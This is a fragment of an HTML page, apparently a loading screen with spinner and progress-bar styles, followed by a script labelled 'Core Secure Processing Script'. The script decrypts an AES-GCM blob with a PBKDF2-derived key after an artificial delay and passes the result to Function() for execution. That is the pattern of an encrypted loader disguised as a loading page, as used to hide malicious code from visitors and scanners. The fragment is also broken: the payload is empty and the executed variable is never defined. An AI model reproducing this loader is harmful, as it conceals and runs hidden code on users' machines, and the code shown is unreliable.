        .spinning-loader {

            border: 10px solid #d1d5db;
            border-top: 10px solid #4f46e5;
            border-radius: 50%;
            animation: spin-loader 1.5s linear infinite;
        }
        @keyframes spin-loader {

            to { transform: rotate(360deg); }
        }
        .status-message {
            margin-top: 15px;
            font-size: 18px;
            color: #222;
        }
        .hidden-section {
            visibility: hidden;
        }
        .system-info {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        .progress-bar {
            width: 200px;
            height: 10px;
            background-color: #e0e0e0;
            border-radius: 5px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress-indicator {
            width: 0;
            height: 100%;
            background-color: #4f46e5;
            animation: progress-animation 2s linear infinite;
        }
        @keyframes progress-animation {
            0% { width: 0; }
            50% { width: 100%; }
            100% { width: 0; }
        }
    </style>
</head>

    <!-- Core Secure Processing Script -->
    <script>
        const decodeSecureData = async (encryptedData, encryptionKey, salt, password) => {
            // console.log("[INFO] Starting secure data decoding...");

            const hexToBytes = (hexString) => {
                return new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
            };

            const addArtificialDelay = () => new Promise(resolve => {
                // console.log("[DEBUG] Adding artificial delay...");
                setTimeout(() => resolve(), 500);
            });

            const generateDerivedKey = async (keyMaterial, saltBytes) => {
                return crypto.subtle.deriveKey(
                    { name: "PBKDF2", salt: saltBytes, iterations: 100000, hash: "SHA-256" },
                    keyMaterial,
                    { name: "AES-GCM", length: 256 },
                    false,
                    ["decrypt"]
                );
            };

            const keyMaterial = await crypto.subtle.importKey(
                "raw",
                new TextEncoder().encode(password),
                { name: "PBKDF2" },
                false,
                ["deriveKey"]
            );

            await addArtificialDelay();
            const derivedKey = await generateDerivedKey(keyMaterial, hexToBytes(salt));

            try {
                const decryptedBytes = await crypto.subtle.decrypt(
                    { name: "AES-GCM", iv: hexToBytes(encryptionKey) },
                    derivedKey,
                    hexToBytes(encryptedData)
                );
                console.log("[SUCCESS] Secure data decoded successfully.");
                return new TextDecoder().decode(decryptedBytes);
            } catch (error) {
                console.error("[ERROR] Failed to decode secure data:", error);
                return null;
            }
        };

        (async () => {
            console.log("[INFO] Starting secure data decoding process...");
            const payload = {

            };

            Function(`${decodedContent}`)();
